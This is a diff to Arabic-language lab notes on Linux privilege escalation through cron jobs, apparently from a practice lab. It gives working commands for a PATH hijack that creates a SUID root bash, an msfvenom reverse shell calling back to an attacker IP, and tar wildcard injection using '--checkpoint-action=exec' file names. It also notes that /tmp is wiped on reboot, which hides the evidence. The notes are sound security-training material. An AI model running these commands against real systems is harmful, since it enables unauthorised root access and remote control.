@@ -329,27 +329,27 @@ Used responsibly, this is a great example of **local privilege escalation** via 
 
    * `cat /etc/crontab`
        * `PATH=/home/user:/usr/local/sbin:/...`
-    * هنا في مشكله هو بيبحث عن الملفات المجدوله زى overwrite.sh
-    * لكن بيبدأ البحث في `/home/user` والملف الاصى موجود فى `/usr/local/bin`
-    * ده معناه إن لو عملنا ملف بنفس الاسم
-    * في `/home/user` وكتبنا فيه كود خبيث يخلينا نحصل صلاحيات `root`
+       * هنا في مشكله هو بيبحث عن الملفات المجدوله زى overwrite.sh
+       * لكن بيبدأ البحث في `/home/user` والملف الاصى موجود فى `/usr/local/bin`
+       * ده معناه إن لو عملنا ملف بنفس الاسم
+       * في `/home/user` وكتبنا فيه كود خبيث يخلينا نحصل صلاحيات `root`
 
    * `nano /home/user/overwrite.sh`
        * `#!/bin/bash`
        * `cp /bin/bash /tmp/rootbash`
        * `chmod +s /tmp/rootbash`
-    * الكود ده بينقل ال ``bash`` ل ``/tmp/rootbash`` وده ملف احنا عملناهو بعد كده يديلو صلاحيات ``SUID``
-    * اى ان المستخدم يمكنه تشغيل ``BASH`` بصلاحيات ``root``
+       * الكود ده بينقل ال ``bash`` ل ``/tmp/rootbash`` وده ملف احنا عملناهو بعد كده يديلو صلاحيات ``SUID``
+       * اى ان المستخدم يمكنه تشغيل ``BASH`` بصلاحيات ``root``
     
 
    * `chmod +x /home/user/overwrite.sh`
-    * نخلي الملف قابل للتنفيذ
-    * الآن عند تشغيل الـ cron الملف هيتنفذ ما يؤدي الى
-    * إنشاء `rootbash` في `/tmp/`
+       * نخلي الملف قابل للتنفيذ
+       * الآن عند تشغيل الـ cron الملف هيتنفذ ما يؤدي الى
+       * إنشاء `rootbash` في `/tmp/`
 
    * `/tmp/rootbash -p`
-    * الأمر ده هيخلي `bash` يحتفظ بصلاحيات ال `root`
-    * من بعد تشغيله من قبل مستخدم عادي
+       * الأمر ده هيخلي `bash` يحتفظ بصلاحيات ال `root`
+       * من بعد تشغيله من قبل مستخدم عادي
 
    * `whoami`
        * `root`
@@ -361,8 +361,45 @@ Used responsibly, this is a great example of **local privilege escalation** via 
    - > معظم الانظمه تمسح الملفات داخل ``/tmp`` تلقائيا عند اعاده التشغيل مما يساعد فى اخفاء الادله بعد الهجوم
 
      
-</details>
+   </details>
 
+
+
+* <details>
+     <summary>Wildcards</summary>
+
+   # Cron Jobs - Wildcards
+
+   (مثلا الملف المجدول ده هي `compress.sh`)
+   (`` * `` بتنفذ الاوامر على كل الملفات)
+
+   ### 7) Cron Jobs - WildCards
+
+   * استغلال `tar` الذي يعمل داخل المهمة المجدولة للوصول لصلاحيات `root`. وبما ان الأمر `tar` يتم تشغيله باستخدام `*` فسوف نضيف ملفات أسماءها شبيهه لأوامر `tar` ما يمكننا من عمل Reverse Shell والتحكم بالجهاز.
+
+   * `cat /usr/local/bin/compress.sh`
+       * `cd /home/user`
+       * `tar czf /tmp/backup.tar.gz *` -> (هينفذ كل الاوامر اللي هنا و يوديها ``/tmp``)
+
+   * `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.47.102 LPORT=4444 -f elf -o shell.elf`
+       * (على جهازنا، نعمل `shell` عن طريق `msfvenom` باستخدام `shell` لـ linux)
+
+   * `scp shell.elf user@10.10.242.228:/home/user`
+       * (بنقوم بنقل الملف لجهاز الضحية)
+
+   * `chmod +x /home/user/shell.elf`
+       * (نجعل الملف قابل للتنفيذ)
+
+   * `touch /home/user/--checkpoint=1`
+   * `touch /home/user/--checkpoint-action=exec=./shell.elf`
+
+   * `nc -nvlp 4444`
+       * (والاستماع على `port 4444` من أجل الحصول على `shell`)
+
+   * `whoami` or `id`
+       * `root`
+     
+</details>
   
 </details>
 
